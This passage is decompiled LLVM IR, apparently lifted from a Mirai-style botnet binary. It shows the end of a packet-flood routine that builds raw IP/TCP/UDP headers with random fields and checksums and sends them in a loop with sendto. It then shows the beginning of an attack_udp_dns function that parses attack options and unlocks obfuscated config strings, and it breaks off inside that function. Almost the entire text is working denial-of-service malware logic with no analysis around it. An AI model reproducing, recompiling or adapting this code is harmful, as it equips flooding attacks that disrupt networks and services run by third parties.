  %v1_bf60 = inttoptr i32 %v0_bf60 to i8*
  %v2_bf60 = load i8, i8* %v1_bf60, align 1
  %v1_bf64 = and i8 %v2_bf60, -16
  %v1_bf68 = or i8 %v1_bf64, 5
  store i8 %v1_bf68, i8* %v1_bf60, align 1
  %v2_bf74 = load i32, i32* @lr, align 4
  %v3_bf74 = add i32 %v2_bf74, 1
  %v4_bf74 = inttoptr i32 %v3_bf74 to i8*
  store i8 %v5_bde8, i8* %v4_bf74, align 1
  %v3_bf78 = load i32, i32* %stack_var_-48, align 4
  %v3_bf7c = mul i32 %v3_bf78, 65536
  %v1_bf80 = add i32 %v3_bf7c, 2097152
  %v3_bf84 = udiv i32 %v1_bf80, 256
  %v4_bf8c = udiv i32 %v1_bf80, 16777216
  %v5_bf8c = or i32 %v3_bf84, %v4_bf8c
  %v3_bf90 = urem i32 %v3_bf78, 65536
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  %v1_bf94 = trunc i32 %v5_bf8c to i16
  %v2_bf94 = load i32, i32* @lr, align 4
  %v3_bf94 = add i32 %v2_bf94, 2
  %v4_bf94 = inttoptr i32 %v3_bf94 to i16*
  store i16 %v1_bf94, i16* %v4_bf94, align 2
  %v0_bf98 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf98 = mul i32 %v0_bf98, 65536
  %v3_bfa0 = add i32 %v1_bf98, 786432
  store i32 %v3_bfa0, i32* %r2.global-to-local, align 4
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  %v2_bfa8 = load i32, i32* @lr, align 4
  %v3_bfa8 = add i32 %v2_bfa8, 8
  %v4_bfa8 = inttoptr i32 %v3_bfa8 to i8*
  store i8 %v1_bfa8, i8* %v4_bfa8, align 1
  %v0_bfac = load i32, i32* %r2.global-to-local, align 4
  %v3_bfac = udiv i32 %v0_bfac, 256
  %v1_bfb0 = and i32 %v3_bfac, 65280
  %v0_bfb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bfb4 = icmp eq i32 %v0_bfb4, 0
  store i1 %v2_bfb4, i1* %cpsr_z.global-to-local, align 1
  %v4_bfb8 = udiv i32 %v0_bfac, 16777216
  %v5_bfb8 = or i32 %v1_bfb0, %v4_bfb8
  store i32 %v5_bfb8, i32* %ip.global-to-local, align 4
  %v2_bfc0 = load i32, i32* @lr, align 4
  %v3_bfc0 = add i32 %v2_bfc0, 9
  %v4_bfc0 = inttoptr i32 %v3_bfc0 to i8*
  store i8 17, i8* %v4_bfc0, align 1
  store i32 ptrtoint (i32* @global_var_2472c.58 to i32), i32* %r3.global-to-local, align 4
  %v0_bfc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bfc8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf24
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_bfcc = load i32, i32* @lr, align 4
  %v4_bfcc = add i32 %v3_bfcc, 6
  %v5_bfcc = inttoptr i32 %v4_bfcc to i16*
  store i16 64, i16* %v5_bfcc, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf24, %bb
  %v2_bfd0 = load i32, i32* @global_var_2472c.58, align 4
  %v1_bfd4 = load i32, i32* @lr, align 4
  %v2_bfd4 = add i32 %v1_bfd4, 12
  %v3_bfd4 = inttoptr i32 %v2_bfd4 to i32*
  store i32 %v2_bfd0, i32* %v3_bfd4, align 4
  store i32 %v2_bf40, i32* %r2.global-to-local, align 4
  %v1_bfdc = add i32 %v2_bf40, 16
  %v2_bfdc = inttoptr i32 %v1_bfdc to i32*
  %v3_bfdc = load i32, i32* %v2_bfdc, align 4
  %v1_bfe0 = load i32, i32* @lr, align 4
  %v2_bfe0 = add i32 %v1_bfe0, 16
  %v3_bfe0 = inttoptr i32 %v2_bfe0 to i32*
  store i32 %v3_bfdc, i32* %v3_bfe0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bfe8 = load i32, i32* @lr, align 4
  %v1_bfe8 = add i32 %v0_bfe8, 20
  store i32 %v1_bfe8, i32* %r4.global-to-local, align 4
  %v2_bfec = add i32 %v0_bfe8, 28
  %v3_bfec = inttoptr i32 %v2_bfec to i32*
  store i32 -1, i32* %v3_bfec, align 4
  %v0_bff0 = load i32, i32* @r5, align 4
  %v1_bff0 = trunc i32 %v0_bff0 to i16
  %v2_bff0 = load i32, i32* @lr, align 4
  %v3_bff0 = add i32 %v2_bff0, 4
  %v4_bff0 = inttoptr i32 %v3_bff0 to i16*
  store i16 %v1_bff0, i16* %v4_bff0, align 2
  %v0_bff4 = load i32, i32* @lr, align 4
  %v1_bff4 = add i32 %v0_bff4, 32
  %v0_bff8 = load i32, i32* %ip.global-to-local, align 4
  %v1_bff8 = trunc i32 %v0_bff8 to i16
  %v2_bff8 = load i32, i32* %r4.global-to-local, align 4
  %v3_bff8 = add i32 %v2_bff8, 4
  %v4_bff8 = inttoptr i32 %v3_bff8 to i16*
  store i16 %v1_bff8, i16* %v4_bff8, align 2
  %v0_bffc = load i32, i32* @r7, align 4
  %v1_bffc = trunc i32 %v0_bffc to i16
  %v2_bffc = load i32, i32* %r4.global-to-local, align 4
  %v3_bffc = add i32 %v2_bffc, 2
  %v4_bffc = inttoptr i32 %v3_bffc to i16*
  store i16 %v1_bffc, i16* %v4_bffc, align 2
  %v0_c000 = load i32, i32* @r6, align 4
  %v1_c000 = trunc i32 %v0_c000 to i16
  %v2_c000 = load i32, i32* @lr, align 4
  %v3_c000 = add i32 %v2_c000, 20
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v1_c000, i16* %v4_c000, align 2
  %v3_c004 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c004, i32* %r2.global-to-local, align 4
  %v3_c008 = call i32 @util_memcpy(i32 %v1_bff4, i32 %v3_be7c, i32 %v3_c004)
  %v3_c00c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = add i32 %v3_c00c, 1
  store i32 %v1_c010, i32* @r4, align 4
  %v1_c014 = load i32, i32* @r8, align 4
  %v9_c014 = icmp eq i32 %v1_c010, %v1_c014
  store i1 %v9_c014, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c010, i32* %stack_var_-44, align 4
  %v5_c01c = icmp slt i32 %v1_c010, %v1_c014
  br i1 %v5_c01c, label %dec_label_pc_bf24, label %dec_label_pc_c020.preheader

dec_label_pc_c020.preheader:                      ; preds = %.thread, %dec_label_pc_bec8
  %v0_c024.ph = phi i32 [ 0, %dec_label_pc_bec8 ], [ %v1_c014, %.thread ]
  %v3_c060 = icmp eq i32 %v3_bed8, 65535
  br label %dec_label_pc_c020

dec_label_pc_c020:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c, %dec_label_pc_c020.preheader
  %v0_c024 = phi i32 [ %v0_c024.ph, %dec_label_pc_c020.preheader ], [ 0, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c020 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c024 = icmp eq i32 %v0_c024, 0
  store i1 %v2_c024, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c024, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c
  br label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c080, %dec_label_pc_c030
  %v1_c044 = phi i32 [ %v1_c0fc, %dec_label_pc_c080 ], [ 0, %dec_label_pc_c030 ]
  %v5_c038 = mul i32 %v1_c044, 24
  %v1_c03c = load i32, i32* @sl, align 4
  %v2_c03c = add i32 %v1_c03c, %v5_c038
  store i32 %v2_c03c, i32* %r3.global-to-local, align 4
  %v1_c040 = add i32 %v2_c03c, 20
  %v2_c040 = inttoptr i32 %v1_c040 to i8*
  %v3_c040 = load i8, i8* %v2_c040, align 1
  %v4_c040 = zext i8 %v3_c040 to i32
  store i32 %v4_c040, i32* %r2.global-to-local, align 4
  %v0_c044 = load i32, i32* @fp, align 4
  %v4_c044 = mul i32 %v1_c044, 4
  %v5_c044 = add i32 %v0_c044, %v4_c044
  %v6_c044 = inttoptr i32 %v5_c044 to i32*
  %v7_c044 = load i32, i32* %v6_c044, align 4
  store i32 %v7_c044, i32* @r5, align 4
  %v7_c04c = icmp eq i8 %v3_c040, 31
  store i1 %v7_c04c, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_c054 = add i32 %v7_c044, 20
  store i32 %v1_c054, i32* @r6, align 4
  %tmp39 = icmp ult i8 %v3_c040, 32
  br i1 %tmp39, label %dec_label_pc_c120, label %dec_label_pc_c05c

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c034
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  store i1 %v3_c060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c060, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c068:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v1_c06c = phi i32 [ %v1_c178, %dec_label_pc_c120 ], [ 65535, %dec_label_pc_c05c ]
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v3_bedc, %v1_c06c
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c06c, label %dec_label_pc_c194, label %dec_label_pc_c074

dec_label_pc_c074:                                ; preds = %dec_label_pc_c180.dec_label_pc_c074_crit_edge, %dec_label_pc_c068
  %v1_c078 = phi i32 [ %v1_c078.pre, %dec_label_pc_c180.dec_label_pc_c074_crit_edge ], [ %v1_c06c, %dec_label_pc_c068 ]
  %v9_c078 = icmp eq i32 %v3_bee0, %v1_c078
  store i1 %v9_c078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c078, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c080:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074, %dec_label_pc_c1a8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c084 = load i32, i32* @r5, align 4
  %v3_c084 = add i32 %v2_c084, 10
  %v4_c084 = inttoptr i32 %v3_c084 to i16*
  store i16 0, i16* %v4_c084, align 2
  %v0_c08c = load i32, i32* @r5, align 4
  store i32 %v0_c08c, i32* @r0, align 4
  %v2_c090 = call i32 @checksum_generic(i32 %v0_c08c, i32 20)
  %v3_c090 = trunc i32 %v2_c090 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c098 = load i32, i32* @r5, align 4
  %v4_c098 = add i32 %v3_c098, 10
  %v5_c098 = inttoptr i32 %v4_c098 to i16*
  store i16 %v3_c090, i16* %v5_c098, align 2
  %v0_c09c = load i32, i32* %r3.global-to-local, align 4
  %v1_c09c = trunc i32 %v0_c09c to i16
  %v2_c09c = load i32, i32* @r6, align 4
  %v3_c09c = add i32 %v2_c09c, 6
  %v4_c09c = inttoptr i32 %v3_c09c to i16*
  store i16 %v1_c09c, i16* %v4_c09c, align 2
  %v3_c0a0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0a0, i32* %r3.global-to-local, align 4
  %v0_c0a4 = load i32, i32* @r6, align 4
  store i32 %v0_c0a4, i32* @r1, align 4
  %v1_c0a8 = add i32 %v0_c0a4, 4
  %v2_c0a8 = inttoptr i32 %v1_c0a8 to i16*
  %v3_c0a8 = load i16, i16* %v2_c0a8, align 2
  %v4_c0a8 = zext i16 %v3_c0a8 to i32
  store i32 %v4_c0a8, i32* %r2.global-to-local, align 4
  %v1_c0ac = add i32 %v3_c0a0, 12
  store i32 %v1_c0ac, i32* %r3.global-to-local, align 4
  %v0_c0b0 = load i32, i32* @r5, align 4
  %v4_c0b4 = call i32 @checksum_tcpudp(i32 %v0_c0b0, i32 %v0_c0a4, i32 %v4_c0a8, i32 %v1_c0ac)
  %v5_c0b4 = trunc i32 %v4_c0b4 to i16
  %v3_c0b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0b8, i32* %r3.global-to-local, align 4
  %v3_c0bc = mul i32 %v3_c0b8, 32
  store i32 %v3_c0bc, i32* %lr.global-to-local, align 4
  %v3_c0c0 = load i32, i32* @r6, align 4
  %v4_c0c0 = add i32 %v3_c0c0, 6
  %v5_c0c0 = inttoptr i32 %v4_c0c0 to i16*
  store i16 %v5_c0b4, i16* %v5_c0c0, align 2
  %v0_c0c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v1_c0c4, -8
  %v5_c0c4 = add i32 %v0_c0c4, %tmp40
  store i32 %v5_c0c4, i32* %lr.global-to-local, align 4
  %v0_c0c8 = load i32, i32* @r6, align 4
  %v1_c0c8 = add i32 %v0_c0c8, 2
  %v2_c0c8 = inttoptr i32 %v1_c0c8 to i16*
  %v3_c0c8 = load i16, i16* %v2_c0c8, align 2
  %v4_c0c8 = zext i16 %v3_c0c8 to i32
  store i32 %v4_c0c8, i32* @r6, align 4
  %v3_c0cc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0cc, i32* %r2.global-to-local, align 4
  %v1_c0d0 = load i32, i32* @sl, align 4
  %v2_c0d0 = add i32 %v1_c0d0, %v5_c0c4
  store i32 %v2_c0d0, i32* @lr, align 4
  %v3_c0d4 = add i32 %v2_c0d0, 2
  %v4_c0d4 = inttoptr i32 %v3_c0d4 to i16*
  store i16 %v3_c0c8, i16* %v4_c0d4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c0e0 = load i32, i32* @r5, align 4
  %v0_c0e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0e4 = add i32 %v0_c0e4, 32
  store i32 %v1_c0e4, i32* %r2.global-to-local, align 4
  %v0_c0e8 = load i32, i32* @sb, align 4
  %v0_c0ec = load i32, i32* @lr, align 4
  %v6_c0f4 = call i32 @__libc_sendto(i32 %v0_c0e8, i32 %v0_c0e0, i32 %v1_c0e4, i32 16384, i32 %v0_c0ec, i32 16)
  %v3_c0f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0f8, i32* %r3.global-to-local, align 4
  %v1_c0fc = add i32 %v3_c0f8, 1
  %v1_c100 = load i32, i32* @r8, align 4
  %v9_c100 = icmp eq i32 %v1_c0fc, %v1_c100
  store i1 %v9_c100, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0fc, i32* %stack_var_-44, align 4
  %v5_c108 = icmp slt i32 %v1_c0fc, %v1_c100
  br i1 %v5_c108, label %dec_label_pc_c034, label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c080
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c110 = icmp eq i32 %v1_c100, 0
  store i1 %v2_c110, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c110, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c120:                                ; preds = %dec_label_pc_c034
  %v1_c120 = add i32 %v2_c03c, 16
  %v2_c120 = inttoptr i32 %v1_c120 to i32*
  %v3_c120 = load i32, i32* %v2_c120, align 4
  store i32 %v3_c120, i32* @r4, align 4
  %v0_c124 = call i32 @rand_next()
  %v3_c128 = load i32, i32* %stack_var_-44, align 4
  %v5_c130 = mul i32 %v3_c128, 24
  %v0_c134 = load i32, i32* @r4, align 4
  %v1_c134 = and i32 %v0_c134, 16711680
  store i32 %v1_c134, i32* %ip.global-to-local, align 4
  %v3_c138 = udiv i32 %v0_c134, 16777216
  %v4_c13c = udiv i32 %v1_c134, 256
  %v5_c13c = or i32 %v4_c13c, %v3_c138
  store i32 %v5_c13c, i32* %r2.global-to-local, align 4
  %v1_c140 = load i32, i32* @sl, align 4
  %v2_c140 = add i32 %v1_c140, %v5_c130
  %v1_c144 = and i32 %v0_c134, 65280
  store i32 %v1_c144, i32* %r3.global-to-local, align 4
  %v1_c148 = add i32 %v2_c140, 20
  %v2_c148 = inttoptr i32 %v1_c148 to i8*
  %v3_c148 = load i8, i8* %v2_c148, align 1
  %v4_c148 = zext i8 %v3_c148 to i32
  store i32 %v4_c148, i32* %ip.global-to-local, align 4
  %v5_c150 = call i32 @llvm.bswap.i32(i32 %v0_c134)
  %v7_c154 = lshr i32 %v0_c124, %v4_c148
  %v8_c154 = add i32 %v7_c154, %v5_c150
  store i32 %v8_c154, i32* %r2.global-to-local, align 4
  %v5_c16c = call i32 @llvm.bswap.i32(i32 %v8_c154)
  %v1_c170 = load i32, i32* @r5, align 4
  %v2_c170 = add i32 %v1_c170, 16
  %v3_c170 = inttoptr i32 %v2_c170 to i32*
  store i32 %v5_c16c, i32* %v3_c170, align 4
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  %v1_c178 = load i32, i32* @r7, align 4
  %v9_c178 = icmp eq i32 %v3_bed8, %v1_c178
  store i1 %v9_c178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c178, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c180:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v0_c180 = call i32 @rand_next()
  %v1_c180 = trunc i32 %v0_c180 to i16
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v1_c188 = load i32, i32* @r7, align 4
  %v9_c188 = icmp eq i32 %v3_bedc, %v1_c188
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  %v3_c18c = load i32, i32* @r5, align 4
  %v4_c18c = add i32 %v3_c18c, 4
  %v5_c18c = inttoptr i32 %v4_c18c to i16*
  store i16 %v1_c180, i16* %v5_c18c, align 2
  br i1 %v9_c188, label %dec_label_pc_c194, label %dec_label_pc_c180.dec_label_pc_c074_crit_edge

dec_label_pc_c180.dec_label_pc_c074_crit_edge:    ; preds = %dec_label_pc_c180
  %v1_c078.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c074

dec_label_pc_c194:                                ; preds = %dec_label_pc_c180, %dec_label_pc_c068
  %v0_c194 = call i32 @rand_next()
  %v1_c194 = trunc i32 %v0_c194 to i16
  %v1_c19c = load i32, i32* @r7, align 4
  %v9_c19c = icmp eq i32 %v3_bee0, %v1_c19c
  store i1 %v9_c19c, i1* %cpsr_z.global-to-local, align 1
  %v3_c1a0 = load i32, i32* @r5, align 4
  %v4_c1a0 = add i32 %v3_c1a0, 20
  %v5_c1a0 = inttoptr i32 %v4_c1a0 to i16*
  store i16 %v1_c194, i16* %v5_c1a0, align 2
  br i1 %v9_c19c, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074
  %v0_c1a8 = call i32 @rand_next()
  %v1_c1a8 = trunc i32 %v0_c1a8 to i16
  %v3_c1ac = load i32, i32* @r6, align 4
  %v4_c1ac = add i32 %v3_c1ac, 2
  %v5_c1ac = inttoptr i32 %v4_c1ac to i16*
  store i16 %v1_c1a8, i16* %v5_c1ac, align 2
  br label %dec_label_pc_c080

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_bea0
  %v0_c1b4 = load i32, i32* @sb, align 4
  %v1_c1b8 = call i32 @__GI___libc_close(i32 %v0_c1b4)
  br label %dec_label_pc_c1bc

dec_label_pc_c1bc:                                ; preds = %entry, %dec_label_pc_c1b4
  %v1_c1c4 = phi i32 [ %v3_be90, %entry ], [ %v1_c1b8, %dec_label_pc_c1b4 ]
  store i32 %v3_bd94, i32* %r4.global-to-local, align 4
  store i32 %v27_bd94, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1c4

; uselistorder directives
  uselistorder i32 %v1_c178, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c0fc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c0c4, { 1, 0 }
  uselistorder i1 %v3_c060, { 1, 0 }
  uselistorder i32 %v1_c010, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf78, { 1, 0 }
  uselistorder i32 %v3_bf10, { 1, 0 }
  uselistorder i32 %v3_bf0c, { 1, 0 }
  uselistorder i32 %v0_bed0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_becc, { 1, 0, 2 }
  uselistorder i32 %v0_bec8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bec0, { 1, 0 }
  uselistorder i1 %v7_be94, { 1, 0 }
  uselistorder i32 %v3_be90, { 1, 2, 3, 0 }
  uselistorder i32 %v1_be30, { 1, 2, 0 }
  uselistorder i32 %v5_be24, { 1, 0 }
  uselistorder i32 %v6_bdc8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_c080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_c1cc = load i32, i32* @sb, align 4
  %v27_c1cc = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_c1ec = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1f0 = load i32, i32* @r5, align 4
  store i32 %v0_c1f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c1fc = load i32, i32* @r4, align 4
  store i32 %v0_c1fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c204 = inttoptr i32 %v0_c1f0 to i32*
  %v6_c204 = call i32 @attack_get_opt_int(i32 %v0_c1fc, i32* %v5_c204, i32 2, i32 0, i32 %v2_c1ec)
  %v1_c210 = urem i32 %v6_c204, 256
  store i32 %v1_c210, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c21c = load i32, i32* @r4, align 4
  store i32 %v0_c21c, i32* %r0.global-to-local, align 4
  %v0_c220 = load i32, i32* @r5, align 4
  store i32 %v0_c220, i32* %r1.global-to-local, align 4
  %sext22 = mul i32 %v6_c204, 16777216
  %v5_c228 = sdiv i32 %sext22, 16777216
  %v6_c228 = inttoptr i32 %v0_c220 to i32*
  %v7_c228 = call i32 @attack_get_opt_int(i32 %v0_c21c, i32* %v6_c228, i32 3, i32 65535, i32 %v5_c228)
  %v0_c22c = load i32, i32* @r5, align 4
  store i32 %v0_c22c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_c238 = load i32, i32* @r4, align 4
  store i32 %v0_c238, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_c240 = inttoptr i32 %v0_c22c to i32*
  %v6_c240 = call i32 @attack_get_opt_int(i32 %v0_c238, i32* %v5_c240, i32 4, i32 64, i32 %v7_c228)
  %v1_c248 = urem i32 %v6_c240, 256
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  %v0_c24c = load i32, i32* @r5, align 4
  store i32 %v0_c24c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c258 = load i32, i32* @r4, align 4
  store i32 %v0_c258, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v6_c240, 16777216
  %v5_c260 = sdiv i32 %sext23, 16777216
  %v6_c260 = inttoptr i32 %v0_c24c to i32*
  %v7_c260 = call i32 @attack_get_opt_int(i32 %v0_c258, i32* %v6_c260, i32 5, i32 0, i32 %v5_c260)
  %v1_c26c = urem i32 %v7_c260, 256
  store i32 %v1_c26c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c278 = load i32, i32* @r4, align 4
  store i32 %v0_c278, i32* %r0.global-to-local, align 4
  %v0_c27c = load i32, i32* @r5, align 4
  store i32 %v0_c27c, i32* %r1.global-to-local, align 4
  %v5_c284 = inttoptr i32 %v0_c27c to i32*
  %v6_c284 = call i32 @attack_get_opt_int(i32 %v0_c278, i32* %v5_c284, i32 6, i32 65535, i32 %v1_c26c)
  %v0_c288 = load i32, i32* @r5, align 4
  store i32 %v0_c288, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c294 = load i32, i32* @r4, align 4
  store i32 %v0_c294, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_c29c = inttoptr i32 %v0_c288 to i32*
  %v6_c29c = call i32 @attack_get_opt_int(i32 %v0_c294, i32* %v5_c29c, i32 7, i32 53, i32 %v6_c284)
  %v0_c2a8 = load i32, i32* @r5, align 4
  store i32 %v0_c2a8, i32* %r1.global-to-local, align 4
  %v0_c2ac = load i32, i32* @r4, align 4
  store i32 %v0_c2ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_c2b8 = inttoptr i32 %v0_c2a8 to i32*
  %v6_c2b8 = call i32 @attack_get_opt_int(i32 %v0_c2ac, i32* %v5_c2b8, i32 9, i32 65535, i32 %v6_c29c)
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c2c8 = load i32, i32* @r4, align 4
  store i32 %v0_c2c8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_c2d0 = inttoptr i32 %v0_c2bc to i32*
  %v6_c2d0 = call i32 @attack_get_opt_int(i32 %v0_c2c8, i32* %v5_c2d0, i32 0, i32 12, i32 %v6_c2b8)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r5, align 4
  store i32 %v0_c2dc, i32* %r1.global-to-local, align 4
  store i32 %v6_c2d0, i32* %sb.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 %v0_c2e4, i32* %r0.global-to-local, align 4
  %v4_c2e8 = inttoptr i32 %v0_c2dc to i32*
  %v5_c2e8 = call i32 @attack_get_opt_str(i32 %v0_c2e4, i32* %v4_c2e8, i32 8, i32 0)
  store i32 %v5_c2e8, i32* @r7, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c2f4 = call i32 @table_unlock_val(i32 24)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_c300 = call i32 @table_retrieve_val(i32 24, i32* null)
  store i32 %v3_c300, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_c308 = call i32 @__libc_open(i32 %v3_c300, i32 0)
  store i32 %v2_c308, i32* @r4, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c314 = call i32 @table_lock_val(i32 24)
  store i32 %v1_c314, i32* %r0.global-to-local, align 4
  %v0_c318 = load i32, i32* @r4, align 4
  %v1_c318 = icmp slt i32 %v0_c318, 0
  %v2_c318 = icmp eq i32 %v0_c318, 0
  store i1 %v2_c318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_c318, label %dec_label_pc_c814, label %dec_label_pc_c320

dec_label_pc_c320:                                ; preds = %entry
  %v2_c324 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_c324, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_c324, i32* @r1, align 4
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  %v1_c334 = call i32 @__libc_read(i32 %v0_c318)
  store i32 %v1_c334, i32* @r5, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v1_c340 = call i32 @__GI___libc_close(i32 %v0_c33c)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_c348 = call i32 @table_unlock_val(i32 25)
  store i32 0, i32* %r1.global-to-local, align 4
